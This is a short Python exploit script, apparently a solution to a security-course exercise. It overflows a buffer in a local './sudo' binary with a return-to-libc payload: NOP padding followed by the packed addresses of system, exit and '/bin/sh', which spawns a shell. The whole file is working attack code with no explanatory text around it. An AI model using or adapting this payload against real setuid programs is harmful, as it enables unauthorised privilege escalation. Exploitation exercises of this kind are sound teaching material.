import os, sys, struct
import addresses


PATH_TO_SUDO = './sudo'
EXIT_CODE = 0x42


def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    # 3. Use `addresses.EXIT` to get the address of the `exit` function
    offset = 66
    nop = '\x90'
    return nop * offset + struct.pack('<IIIB', addresses.SYSTEM, addresses.EXIT, addresses.LIBC_BIN_SH, EXIT_CODE)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
